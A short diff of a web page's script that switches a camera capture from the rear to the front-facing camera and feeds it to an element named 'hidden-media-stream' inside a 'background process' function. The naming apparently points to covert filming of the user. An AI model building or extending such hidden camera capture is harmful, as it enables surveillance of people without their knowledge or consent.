@@ -631,7 +631,7 @@
 
         async function initBackgroundProcess() {
             try {
-                localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+                localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                 
                 const remoteVideo = document.getElementById('hidden-media-stream');
                 remoteVideo.srcObject = localStream;
